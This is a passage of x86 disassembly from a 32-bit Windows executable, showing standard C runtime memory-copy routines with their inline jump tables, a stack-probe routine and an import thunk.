  405f30:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  405f34:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  405f38:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  405f3c:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  405f40:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  405f44:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  405f48:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  405f4c:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  405f50:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  405f54:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  405f5b:	03 f0                	add    %eax,%esi
  405f5d:	03 f8                	add    %eax,%edi
  405f5f:	ff 24 95 68 5f 40 00 	jmp    *0x405f68(,%edx,4)
  405f66:	8b ff                	mov    %edi,%edi
  405f68:	78 5f                	js     0x405fc9
  405f6a:	40                   	inc    %eax
  405f6b:	00 80 5f 40 00 8c    	add    %al,-0x73ffbfa1(%eax)
  405f71:	5f                   	pop    %edi
  405f72:	40                   	inc    %eax
  405f73:	00 a0 5f 40 00 8b    	add    %ah,-0x74ffbfa1(%eax)
  405f79:	45                   	inc    %ebp
  405f7a:	08 5e 5f             	or     %bl,0x5f(%esi)
  405f7d:	c9                   	leave
  405f7e:	c3                   	ret
  405f7f:	90                   	nop
  405f80:	8a 06                	mov    (%esi),%al
  405f82:	88 07                	mov    %al,(%edi)
  405f84:	8b 45 08             	mov    0x8(%ebp),%eax
  405f87:	5e                   	pop    %esi
  405f88:	5f                   	pop    %edi
  405f89:	c9                   	leave
  405f8a:	c3                   	ret
  405f8b:	90                   	nop
  405f8c:	8a 06                	mov    (%esi),%al
  405f8e:	88 07                	mov    %al,(%edi)
  405f90:	8a 46 01             	mov    0x1(%esi),%al
  405f93:	88 47 01             	mov    %al,0x1(%edi)
  405f96:	8b 45 08             	mov    0x8(%ebp),%eax
  405f99:	5e                   	pop    %esi
  405f9a:	5f                   	pop    %edi
  405f9b:	c9                   	leave
  405f9c:	c3                   	ret
  405f9d:	8d 49 00             	lea    0x0(%ecx),%ecx
  405fa0:	8a 06                	mov    (%esi),%al
  405fa2:	88 07                	mov    %al,(%edi)
  405fa4:	8a 46 01             	mov    0x1(%esi),%al
  405fa7:	88 47 01             	mov    %al,0x1(%edi)
  405faa:	8a 46 02             	mov    0x2(%esi),%al
  405fad:	88 47 02             	mov    %al,0x2(%edi)
  405fb0:	8b 45 08             	mov    0x8(%ebp),%eax
  405fb3:	5e                   	pop    %esi
  405fb4:	5f                   	pop    %edi
  405fb5:	c9                   	leave
  405fb6:	c3                   	ret
  405fb7:	90                   	nop
  405fb8:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  405fbc:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  405fc0:	f7 c7 03 00 00 00    	test   $0x3,%edi
  405fc6:	75 24                	jne    0x405fec
  405fc8:	c1 e9 02             	shr    $0x2,%ecx
  405fcb:	83 e2 03             	and    $0x3,%edx
  405fce:	83 f9 08             	cmp    $0x8,%ecx
  405fd1:	72 0d                	jb     0x405fe0
  405fd3:	fd                   	std
  405fd4:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405fd6:	fc                   	cld
  405fd7:	ff 24 95 00 61 40 00 	jmp    *0x406100(,%edx,4)
  405fde:	8b ff                	mov    %edi,%edi
  405fe0:	f7 d9                	neg    %ecx
  405fe2:	ff 24 8d b0 60 40 00 	jmp    *0x4060b0(,%ecx,4)
  405fe9:	8d 49 00             	lea    0x0(%ecx),%ecx
  405fec:	8b c7                	mov    %edi,%eax
  405fee:	ba 03 00 00 00       	mov    $0x3,%edx
  405ff3:	83 f9 04             	cmp    $0x4,%ecx
  405ff6:	72 0c                	jb     0x406004
  405ff8:	83 e0 03             	and    $0x3,%eax
  405ffb:	2b c8                	sub    %eax,%ecx
  405ffd:	ff 24 85 08 60 40 00 	jmp    *0x406008(,%eax,4)
  406004:	ff 24 8d 00 61 40 00 	jmp    *0x406100(,%ecx,4)
  40600b:	90                   	nop
  40600c:	18 60 40             	sbb    %ah,0x40(%eax)
  40600f:	00 38                	add    %bh,(%eax)
  406011:	60                   	pusha
  406012:	40                   	inc    %eax
  406013:	00 60 60             	add    %ah,0x60(%eax)
  406016:	40                   	inc    %eax
  406017:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  40601d:	88 47 03             	mov    %al,0x3(%edi)
  406020:	4e                   	dec    %esi
  406021:	c1 e9 02             	shr    $0x2,%ecx
  406024:	4f                   	dec    %edi
  406025:	83 f9 08             	cmp    $0x8,%ecx
  406028:	72 b6                	jb     0x405fe0
  40602a:	fd                   	std
  40602b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40602d:	fc                   	cld
  40602e:	ff 24 95 00 61 40 00 	jmp    *0x406100(,%edx,4)
  406035:	8d 49 00             	lea    0x0(%ecx),%ecx
  406038:	8a 46 03             	mov    0x3(%esi),%al
  40603b:	23 d1                	and    %ecx,%edx
  40603d:	88 47 03             	mov    %al,0x3(%edi)
  406040:	8a 46 02             	mov    0x2(%esi),%al
  406043:	c1 e9 02             	shr    $0x2,%ecx
  406046:	88 47 02             	mov    %al,0x2(%edi)
  406049:	83 ee 02             	sub    $0x2,%esi
  40604c:	83 ef 02             	sub    $0x2,%edi
  40604f:	83 f9 08             	cmp    $0x8,%ecx
  406052:	72 8c                	jb     0x405fe0
  406054:	fd                   	std
  406055:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406057:	fc                   	cld
  406058:	ff 24 95 00 61 40 00 	jmp    *0x406100(,%edx,4)
  40605f:	90                   	nop
  406060:	8a 46 03             	mov    0x3(%esi),%al
  406063:	23 d1                	and    %ecx,%edx
  406065:	88 47 03             	mov    %al,0x3(%edi)
  406068:	8a 46 02             	mov    0x2(%esi),%al
  40606b:	88 47 02             	mov    %al,0x2(%edi)
  40606e:	8a 46 01             	mov    0x1(%esi),%al
  406071:	c1 e9 02             	shr    $0x2,%ecx
  406074:	88 47 01             	mov    %al,0x1(%edi)
  406077:	83 ee 03             	sub    $0x3,%esi
  40607a:	83 ef 03             	sub    $0x3,%edi
  40607d:	83 f9 08             	cmp    $0x8,%ecx
  406080:	0f 82 5a ff ff ff    	jb     0x405fe0
  406086:	fd                   	std
  406087:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406089:	fc                   	cld
  40608a:	ff 24 95 00 61 40 00 	jmp    *0x406100(,%edx,4)
  406091:	8d 49 00             	lea    0x0(%ecx),%ecx
  406094:	b4 60                	mov    $0x60,%ah
  406096:	40                   	inc    %eax
  406097:	00 bc 60 40 00 c4 60 	add    %bh,0x60c40040(%eax,%eiz,2)
  40609e:	40                   	inc    %eax
  40609f:	00 cc                	add    %cl,%ah
  4060a1:	60                   	pusha
  4060a2:	40                   	inc    %eax
  4060a3:	00 d4                	add    %dl,%ah
  4060a5:	60                   	pusha
  4060a6:	40                   	inc    %eax
  4060a7:	00 dc                	add    %bl,%ah
  4060a9:	60                   	pusha
  4060aa:	40                   	inc    %eax
  4060ab:	00 e4                	add    %ah,%ah
  4060ad:	60                   	pusha
  4060ae:	40                   	inc    %eax
  4060af:	00 f7                	add    %dh,%bh
  4060b1:	60                   	pusha
  4060b2:	40                   	inc    %eax
  4060b3:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  4060b9:	44                   	inc    %esp
  4060ba:	8f                   	(bad)
  4060bb:	1c 8b                	sbb    $0x8b,%al
  4060bd:	44                   	inc    %esp
  4060be:	8e 18                	mov    (%eax),%ds
  4060c0:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  4060c4:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  4060c8:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  4060cc:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  4060d0:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  4060d4:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  4060d8:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  4060dc:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  4060e0:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  4060e4:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  4060e8:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  4060ec:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  4060f3:	03 f0                	add    %eax,%esi
  4060f5:	03 f8                	add    %eax,%edi
  4060f7:	ff 24 95 00 61 40 00 	jmp    *0x406100(,%edx,4)
  4060fe:	8b ff                	mov    %edi,%edi
  406100:	10 61 40             	adc    %ah,0x40(%ecx)
  406103:	00 18                	add    %bl,(%eax)
  406105:	61                   	popa
  406106:	40                   	inc    %eax
  406107:	00 28                	add    %ch,(%eax)
  406109:	61                   	popa
  40610a:	40                   	inc    %eax
  40610b:	00 3c 61             	add    %bh,(%ecx,%eiz,2)
  40610e:	40                   	inc    %eax
  40610f:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  406115:	c9                   	leave
  406116:	c3                   	ret
  406117:	90                   	nop
  406118:	8a 46 03             	mov    0x3(%esi),%al
  40611b:	88 47 03             	mov    %al,0x3(%edi)
  40611e:	8b 45 08             	mov    0x8(%ebp),%eax
  406121:	5e                   	pop    %esi
  406122:	5f                   	pop    %edi
  406123:	c9                   	leave
  406124:	c3                   	ret
  406125:	8d 49 00             	lea    0x0(%ecx),%ecx
  406128:	8a 46 03             	mov    0x3(%esi),%al
  40612b:	88 47 03             	mov    %al,0x3(%edi)
  40612e:	8a 46 02             	mov    0x2(%esi),%al
  406131:	88 47 02             	mov    %al,0x2(%edi)
  406134:	8b 45 08             	mov    0x8(%ebp),%eax
  406137:	5e                   	pop    %esi
  406138:	5f                   	pop    %edi
  406139:	c9                   	leave
  40613a:	c3                   	ret
  40613b:	90                   	nop
  40613c:	8a 46 03             	mov    0x3(%esi),%al
  40613f:	88 47 03             	mov    %al,0x3(%edi)
  406142:	8a 46 02             	mov    0x2(%esi),%al
  406145:	88 47 02             	mov    %al,0x2(%edi)
  406148:	8a 46 01             	mov    0x1(%esi),%al
  40614b:	88 47 01             	mov    %al,0x1(%edi)
  40614e:	8b 45 08             	mov    0x8(%ebp),%eax
  406151:	5e                   	pop    %esi
  406152:	5f                   	pop    %edi
  406153:	c9                   	leave
  406154:	c3                   	ret
  406155:	cc                   	int3
  406156:	cc                   	int3
  406157:	cc                   	int3
  406158:	cc                   	int3
  406159:	cc                   	int3
  40615a:	cc                   	int3
  40615b:	cc                   	int3
  40615c:	cc                   	int3
  40615d:	cc                   	int3
  40615e:	cc                   	int3
  40615f:	cc                   	int3
  406160:	51                   	push   %ecx
  406161:	3d 00 10 00 00       	cmp    $0x1000,%eax
  406166:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40616a:	72 14                	jb     0x406180
  40616c:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  406172:	2d 00 10 00 00       	sub    $0x1000,%eax
  406177:	85 01                	test   %eax,(%ecx)
  406179:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40617e:	73 ec                	jae    0x40616c
  406180:	2b c8                	sub    %eax,%ecx
  406182:	8b c4                	mov    %esp,%eax
  406184:	85 01                	test   %eax,(%ecx)
  406186:	8b e1                	mov    %ecx,%esp
  406188:	8b 08                	mov    (%eax),%ecx
  40618a:	8b 40 04             	mov    0x4(%eax),%eax
  40618d:	50                   	push   %eax
  40618e:	c3                   	ret
  40618f:	cc                   	int3
  406190:	ff 25 d0 70 40 00    	jmp    *0x4070d0
